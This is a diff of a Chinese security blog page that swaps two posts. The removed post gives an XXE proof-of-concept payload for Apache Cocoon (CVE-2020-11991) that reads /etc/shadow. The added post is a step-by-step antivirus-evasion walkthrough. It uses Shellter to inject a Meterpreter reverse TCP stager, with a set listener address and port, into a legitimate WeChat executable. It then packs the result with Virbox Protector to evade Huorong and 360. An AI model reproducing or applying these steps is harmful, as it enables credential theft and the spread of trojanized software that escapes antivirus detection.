@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC | Sec H</title>
+    <title>Shellter结合Virbox Protector Bypass火绒&amp;360 | Sec H</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="Sec H, 信息安全, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="Sec H 信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610798105263.css">
+<link rel="stylesheet" href="/css/style.css?v=1610798105245.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/index.html" class="item ">
+            <li rel="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/index.html" class="item ">
+            <li rel="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,27 +105,30 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC</span></h3>
+        <h3 class="post-title"><span>Shellter结合Virbox Protector Bypass火绒&amp;360</span></h3>
     </header>
     <p class="post-meta text-center">
-        Jelon 发表于
-        <time datetime="2020-12-23T09:09:02.564Z">2020-12-23</time>
+        givemefivw 发表于
+        <time datetime="2021-01-16T11:50:58.000Z">2021-01-16</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache Cocoon &lt;= 2.1.12</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>向<code>/v2/api/product/manger/getInfo</code>位置 <code>POST</code>如下内容即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt; ]&gt;</span><br><span class="line">&lt;userInfo&gt;</span><br><span class="line">&lt;firstName&gt;John&lt;&#x2F;firstName&gt;</span><br><span class="line">&lt;lastName&gt;&amp;ent;&lt;&#x2F;lastName&gt;</span><br><span class="line">&lt;&#x2F;userInfo&gt;</span><br></pre></td></tr></table></figure>
+        <p>首先仍然是找到一个合法的PE文件作为被注入程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Choose Operation Mode - Auto&#x2F;Manual (A&#x2F;M&#x2F;H): A</span><br><span class="line"></span><br><span class="line">Perform Online Version Check? (Y&#x2F;N&#x2F;H): N</span><br><span class="line"></span><br><span class="line">PE Target: E:\AntiPalyloads\Wechat.exe</span><br><span class="line"></span><br><span class="line">**********</span><br><span class="line">* Backup *</span><br><span class="line">**********</span><br><span class="line"></span><br><span class="line">Backup: Shellter_Backups\Wechat.exe</span><br></pre></td></tr></table></figure>
+<p>接下来选择监听类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">************</span><br><span class="line">* Payloads *</span><br><span class="line">************</span><br><span class="line"></span><br><span class="line">[1] Meterpreter_Reverse_TCP   [stager]</span><br><span class="line">[2] Meterpreter_Reverse_HTTP  [stager]</span><br><span class="line">[3] Meterpreter_Reverse_HTTPS [stager]</span><br><span class="line">[4] Meterpreter_Bind_TCP      [stager]</span><br><span class="line">[5] Shell_Reverse_TCP         [stager]</span><br><span class="line">[6] Shell_Bind_TCP            [stager]</span><br><span class="line">[7] WinExec</span><br><span class="line"></span><br><span class="line">Use a listed payload or custom? (L&#x2F;C&#x2F;H): L</span><br><span class="line"></span><br><span class="line">Select payload by index: 1</span><br><span class="line"></span><br><span class="line">***************************</span><br><span class="line">* meterpreter_reverse_tcp *</span><br><span class="line">***************************</span><br><span class="line"></span><br><span class="line">SET LHOST: 192.168.70.138</span><br><span class="line"></span><br><span class="line">SET LPORT: 9988</span><br></pre></td></tr></table></figure>
+<p>等待程序生成，对比前后两个文件，发现变小了些<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/7.png"><br>这时候的文件是会被火绒查杀到的<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/8.png"><br>接下来打开Virbox Protextor，将注入后的文件拖入进去<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/9.png"><br>点击添加函数，有三种方法：代码混淆、代码虚拟化、代码加密<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/10.png"><br>具体选哪个可以暂时随意，例如都选代码混淆<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/11.png"><br>点击确定，再点击加密选项，将选项全部勾选<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/12.png"><br>最后，点击保护选中的项目，会自动生成一个WeChat.ssp.exe文件（本例中WeChat.ssp.exe只是例子，没有进行最后一步）<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/13.png"><br>最后，在开启火绒和360的情况下，测试上线<br><img src="/2021/01/16/Shellter%E7%BB%93%E5%90%88Virbox-Protector-Bypass%E7%81%AB%E7%BB%92-360/14.png"></p>
+
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
         <span class="post-cat">分类：
-            
+            <a class="cat-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
         </span>
         <span class="post-tags">
             标签：
             
     
-        <a href="/tags/POC/" title="POC">POC</a>
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
     
 
         </span>
@@ -151,20 +154,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2020/12/24/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%20%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDPOC/">
-            
-                CVE-2020-5398-Spring MVC的RFD 反射文件下载POC
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/">
+        <a href="/2021/01/16/BypassAV/">
             
-                免杀实验笔记之DKMC
+                BypassAV
             
         </a>
     </span>
@@ -279,7 +278,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610798105264.js"></script>
+<script src="/js/main.js?v=1610798105246.js"></script>
 
 
 </body>
